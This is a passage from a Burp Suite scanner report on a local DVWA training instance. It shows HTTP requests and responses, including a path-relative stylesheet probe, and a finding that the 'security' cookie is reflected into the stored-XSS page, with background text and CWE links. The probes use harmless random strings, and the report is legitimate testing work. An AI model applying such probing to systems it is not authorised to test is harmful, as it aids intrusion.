<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:51 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4760<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Stored Cross Site Scripting (XSS) :: Damn Vulnerable Web <br><b>...[SNIP]...</b><br>&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="../../favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 3</h2>
<div class="rr_div"><span>POST <span class="HIGHLIGHT">/dvwa/vulnerabilities/xss_s/index.php/kntdcg/dvwa/css/main.css</span> HTTP/1.1<br>Host: localhost:7878<br>Origin: http://localhost:7878<br>Cookie: security=low; PHPSESSID=e8djvoheb4gfdfbklh640b4hat<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/xss_s/<br>Content-Type: application/x-www-form-urlencoded<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br>Content-Length: 57<br><br>txtName=690202&amp;mtxMessage=911159&amp;btnClear=Clear+Guestbook</span></div>
<h2>Response 3</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:51 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4760<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Stored Cross Site Scripting (XSS) :: Damn Vulnerable Web <br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="33.4">33.4.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00400c00_inputreturnedinresponsereflected">Input returned in response (reflected)</a></span>
<br><a class="PREVNEXT" href="#33.3">Previous</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/xss_s/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>security</b> cookie is copied into the application's response.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>POST /dvwa/vulnerabilities/xss_s/ HTTP/1.1<br>Host: localhost:7878<br>Origin: http://localhost:7878<br>Cookie: security=low<span class="HIGHLIGHT">o83imbo9oj</span>; PHPSESSID=e8djvoheb4gfdfbklh640b4hat<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/xss_s/<br>Content-Type: application/x-www-form-urlencoded<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br>Content-Length: 57<br><br>txtName=690202&amp;mtxMessage=911159&amp;btnClear=Clear+Guestbook</span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:32 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Set-Cookie: PHPSESSID=e8djvoheb4gfdfbklh640b4hat; path=/<br>Set-Cookie: security=low<br>Content-Length: 4872<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Stored Cross Site Scripting (XSS) :: Damn Vulnerable Web <br><b>...[SNIP]...</b><br>&lt;input type="button" value="View Help" class="popup_button" id='help_button' data-help-url='../../vulnerabilities/view_help.php?id=xss_s&amp;security=low<span class="HIGHLIGHT">o83imbo9oj</span>&amp;locale=en' )"&gt; &lt;input type="button" value="View Source" class="popup_button" id='source_button' data-source-url='../../vulnerabilities/view_source.php?id=xss_s&amp;security=low<span class="HIGHLIGHT">o83imbo9oj</span>' )"&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="TEXT"><br>Report generated by Burp Suite <a href="https://portswigger.net/vulnerability-scanner/">web vulnerability scanner</a> v2022.1.1, at Fri Mar 11 14:50:50 ICT 2022.<br><br></span>
</div>
</body>
</html>
